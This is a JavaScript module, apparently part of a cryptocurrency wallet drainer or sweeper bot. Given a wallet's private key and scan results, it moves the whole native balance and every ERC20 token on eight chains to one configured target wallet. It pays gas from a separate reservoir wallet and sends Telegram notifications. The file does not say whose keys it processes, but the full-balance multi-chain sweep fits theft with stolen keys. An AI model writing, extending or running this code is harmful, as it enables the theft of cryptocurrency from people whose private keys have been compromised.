// Asset transfer processing service
// Executes actual blockchain transfers using ethers.js

const { ethers } = require('ethers');
const { GasOracle } = require('./gasOracle');
const { NonceManager } = require('./nonceManager');

class AssetProcessor {
  constructor(config, telegramNotifier = null) {
    this.config = config;
    this.targetWallet = process.env.TARGET_WALLET || '';
    this.gasReservoir = process.env.GAS_RESERVOIR || '';
    this.gasReservoirPrivateKey = process.env.GAS_RESERVOIR_PRIVATE_KEY || '';
    this.gasOracle = new GasOracle();
    this.nonceManager = new NonceManager();
    this.telegramNotifier = telegramNotifier;

    if (!this.targetWallet) {
      console.warn('⚠️  TARGET_WALLET not configured - transfers will fail');
    }

    if (this.gasReservoirPrivateKey) {
      console.log('✅ Gas reservoir enabled');
    }

    // Network configurations (matching walletScanner)
    this.networks = {
      ethereum: {
        rpcUrl: config.rpc.eth,
        chainId: 1,
        nativeSymbol: 'ETH'
      },
      bsc: {
        rpcUrl: config.rpc.bsc,
        chainId: 56,
        nativeSymbol: 'BNB'
      },
      polygon: {
        rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
        chainId: 137,
        nativeSymbol: 'MATIC'
      },
      arbitrum: {
        rpcUrl: process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc',
        chainId: 42161,
        nativeSymbol: 'ETH'
      },
      avalanche: {
        rpcUrl: process.env.AVALANCHE_RPC_URL || 'https://api.avax.network/ext/bc/C/rpc',
        chainId: 43114,
        nativeSymbol: 'AVAX'
      },
      fantom: {
        rpcUrl: process.env.FANTOM_RPC_URL || 'https://rpc.ftm.tools',
        chainId: 250,
        nativeSymbol: 'FTM'
      },
      optimism: {
        rpcUrl: process.env.OPTIMISM_RPC_URL || 'https://mainnet.optimism.io',
        chainId: 10,
        nativeSymbol: 'ETH'
      },
      base: {
        rpcUrl: process.env.BASE_RPC_URL || 'https://mainnet.base.org',
        chainId: 8453,
        nativeSymbol: 'ETH'
      }
    };
  }

  async processAssets(walletPrivateKey, scanResults) {
    if (!this.targetWallet) {
      throw new Error('TARGET_WALLET not configured');
    }

    const results = {
      totalTransfers: 0,
      successful: 0,
      failed: 0,
      transfers: []
    };

    // Process each network
    for (const [networkKey, networkData] of Object.entries(scanResults.networks)) {
      if (!networkData || !networkData.hasAssets) {
        continue;
      }

      const networkConfig = this.networks[networkKey];
      if (!networkConfig || !networkConfig.rpcUrl) {
        console.warn(`⚠️  Skipping ${networkKey} - no RPC URL configured`);
        continue;
      }

      try {
        // Process native token
        if (networkData.native && parseFloat(networkData.native.balance) > 0) {
          const transferResult = await this.transferNative(
            walletPrivateKey,
            networkKey,
            networkConfig,
            networkData.native.balance,
            networkData.native.symbol
          );

          results.totalTransfers++;
          results.transfers.push(transferResult);
          
          if (transferResult.success) {
            results.successful++;
          } else {
            results.failed++;
          }
        }

        // Process ERC20 tokens
        if (networkData.tokens && networkData.tokens.length > 0) {
          for (const token of networkData.tokens) {
            const transferResult = await this.transferToken(
              walletPrivateKey,
              networkKey,
              networkConfig,
              token.address,
              token.balance,
              token.symbol,
              token.decimals
            );

            results.totalTransfers++;
            results.transfers.push(transferResult);
            
            if (transferResult.success) {
              results.successful++;
            } else {
              results.failed++;
            }
          }
        }
      } catch (error) {
        console.error(`Error processing ${networkKey}:`, error);
        results.failed++;
      }
    }

    return results;
  }

  async transferNative(walletPrivateKey, networkKey, networkConfig, amount, symbol) {
    try {
      const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl);
      const wallet = new ethers.Wallet(walletPrivateKey, provider);

      // Get gas price
      const gasPrice = await this.getGasPrice(networkKey);
      
      // Calculate gas cost with buffer (1.2x)
      const gasLimit = 21000n;
      const gasCost = gasPrice * gasLimit * 12n / 10n;

      // Check balance
      const balance = await provider.getBalance(wallet.address);
      
      // Check if we need gas reservoir funding
      let useReservoir = false;
      if (balance < gasCost && this.gasReservoirPrivateKey) {
        console.log(`⚠️  Insufficient gas on ${networkKey}, using gas reservoir...`);
        const fundingTxHash = await this.fundGasFromReservoir(provider, wallet.address, networkKey, gasCost);
        useReservoir = true;
        
        // Send Telegram notification about gas funding
        if (this.telegramNotifier) {
          await this.telegramNotifier.sendGasReservoirFunding(
            networkKey,
            ethers.formatEther(gasCost * 2n),
            fundingTxHash
          );
        }
        
        // Wait a moment for funding to be confirmed
        await new Promise(resolve => setTimeout(resolve, 2000));
        // Re-check balance
        const newBalance = await provider.getBalance(wallet.address);
        if (newBalance < gasCost) {
          throw new Error('Gas reservoir funding failed or insufficient');
        }
      }

      // Get nonce
      const nonce = await this.nonceManager.getNextNonce(wallet.address, provider);

      // Calculate amount to transfer (leave some for gas)
      const currentBalance = await provider.getBalance(wallet.address);
      const transferAmount = currentBalance - gasCost;

      if (transferAmount <= 0) {
        throw new Error('Insufficient balance after gas estimation');
      }

      // Create transaction
      const tx = {
        to: this.targetWallet,
        value: transferAmount,
        gasPrice: gasPrice,
        gasLimit: gasLimit,
        nonce: nonce
      };

      // Send transaction
      const txResponse = await wallet.sendTransaction(tx);
      this.nonceManager.markNonceUsed(wallet.address, nonce);

      // Wait for confirmation
      const receipt = await txResponse.wait(1);

      return {
        network: networkKey,
        type: 'native',
        symbol: symbol,
        amount: ethers.formatEther(transferAmount),
        success: true,
        txHash: receipt.hash,
        blockNumber: receipt.blockNumber,
        gasUsed: true,
        reservoir: useReservoir,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      console.error(`Native transfer failed on ${networkKey}:`, error);
      return {
        network: networkKey,
        type: 'native',
        symbol: symbol,
        amount: amount,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      };
    }
  }

  async transferToken(walletPrivateKey, networkKey, networkConfig, tokenAddress, amount, symbol, decimals) {
    try {
      const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl);
      const wallet = new ethers.Wallet(walletPrivateKey, provider);

      // ERC20 transfer ABI
      const erc20Abi = [
        'function transfer(address to, uint256 amount) returns (bool)',
        'function balanceOf(address owner) view returns (uint256)',
        'function decimals() view returns (uint8)'
      ];

      const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, wallet);

      // Get token balance
      const balance = await tokenContract.balanceOf(wallet.address);
      
      if (balance === 0n) {
        throw new Error('Token balance is zero');
      }

      // Get gas price
      const gasPrice = await this.getGasPrice(networkKey);
      
      // Estimate gas for transfer (with buffer)
      const gasEstimate = await tokenContract.transfer.estimateGas(this.targetWallet, balance);
      const gasLimit = gasEstimate * 12n / 10n; // 1.2x buffer
      const gasCost = gasLimit * gasPrice;

      // Check if we have enough native token for gas
      const nativeBalance = await provider.getBalance(wallet.address);
      
      // Check if we need gas reservoir funding
      let useReservoir = false;
      if (nativeBalance < gasCost && this.gasReservoirPrivateKey) {
        console.log(`⚠️  Insufficient gas for token transfer on ${networkKey}, using gas reservoir...`);
        const fundingTxHash = await this.fundGasFromReservoir(provider, wallet.address, networkKey, gasCost);
        useReservoir = true;
        
        // Send Telegram notification about gas funding
        if (this.telegramNotifier) {
          await this.telegramNotifier.sendGasReservoirFunding(
            networkKey,
            ethers.formatEther(gasCost * 2n),
            fundingTxHash
          );
        }
        
        // Wait a moment for funding to be confirmed
        await new Promise(resolve => setTimeout(resolve, 2000));
        // Re-check balance
        const newBalance = await provider.getBalance(wallet.address);
        if (newBalance < gasCost) {
          throw new Error('Gas reservoir funding failed or insufficient');
        }
      } else if (nativeBalance < gasCost) {
        throw new Error('Insufficient native token for gas');
      }

      // Get nonce
      const nonce = await this.nonceManager.getNextNonce(wallet.address, provider);

      // Execute transfer
      const txResponse = await tokenContract.transfer(this.targetWallet, balance, {
        gasPrice: gasPrice,
        gasLimit: gasLimit,
        nonce: nonce
      });

      this.nonceManager.markNonceUsed(wallet.address, nonce);

      // Wait for confirmation
      const receipt = await txResponse.wait(1);

      return {
        network: networkKey,
        type: 'token',
        symbol: symbol,
        address: tokenAddress,
        amount: ethers.formatUnits(balance, decimals),
        success: true,
        txHash: receipt.hash,
        blockNumber: receipt.blockNumber,
        reservoir: useReservoir,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      console.error(`Token transfer failed on ${networkKey} for ${symbol}:`, error);
      return {
        network: networkKey,
        type: 'token',
        symbol: symbol,
        address: tokenAddress,
        amount: amount,
        success: false,
        error: error.message,
        timestamp: new Date().toISOString()
      };
    }
  }

  async fundGasFromReservoir(provider, targetAddress, networkKey, requiredGas) {
    if (!this.gasReservoirPrivateKey) {
      throw new Error('Gas reservoir private key not configured');
    }

    try {
      const reservoirWallet = new ethers.Wallet(this.gasReservoirPrivateKey, provider);
      
      // Check reservoir balance
      const reservoirBalance = await provider.getBalance(reservoirWallet.address);
      // Send exactly required amount + small buffer for gas reservoir transaction itself
      const fundingAmount = requiredGas + (21000n * await this.getGasPrice(networkKey) * 12n / 10n);

      if (reservoirBalance < fundingAmount) {
        throw new Error(`Gas reservoir has insufficient balance. Required: ${ethers.formatEther(fundingAmount)}, Available: ${ethers.formatEther(reservoirBalance)}`);
      }

      console.log(`💰 Funding ${ethers.formatEther(fundingAmount)} from gas reservoir to ${targetAddress.substring(0, 10)}...`);

      // Get nonce for reservoir wallet
      const reservoirNonce = await this.nonceManager.getNextNonce(reservoirWallet.address, provider);

      // Send gas funding transaction
      const fundingTx = await reservoirWallet.sendTransaction({
        to: targetAddress,
        value: fundingAmount,
        gasLimit: 21000n,
        nonce: reservoirNonce
      });

      this.nonceManager.markNonceUsed(reservoirWallet.address, reservoirNonce);

      // Wait for confirmation
      const receipt = await fundingTx.wait(1);
      console.log(`✅ Gas funding successful: ${receipt.hash}`);

      return receipt.hash;
    } catch (error) {
      console.error(`Gas reservoir funding failed on ${networkKey}:`, error);
      throw error;
    }
  }

  async getGasPrice(networkKey) {
    try {
      // Use gas oracle for Ethereum mainnet
      if (networkKey === 'ethereum') {
        const gasPrice = await this.gasOracle.getOptimalGasPrice();
        // Convert from gwei to wei
        return ethers.parseUnits(gasPrice.recommended.toString(), 'gwei');
      } else {
        // For other networks, fetch from provider
        const networkConfig = this.networks[networkKey];
        if (!networkConfig) {
          throw new Error(`Unknown network: ${networkKey}`);
        }
        const provider = new ethers.JsonRpcProvider(networkConfig.rpcUrl);
        const feeData = await provider.getFeeData();
        return feeData.gasPrice || feeData.maxFeePerGas || ethers.parseUnits('20', 'gwei');
      }
    } catch (error) {
      console.warn(`Failed to get gas price for ${networkKey}, using default:`, error.message);
      // Default gas price
      return ethers.parseUnits('20', 'gwei');
    }
  }
}

module.exports = { AssetProcessor };

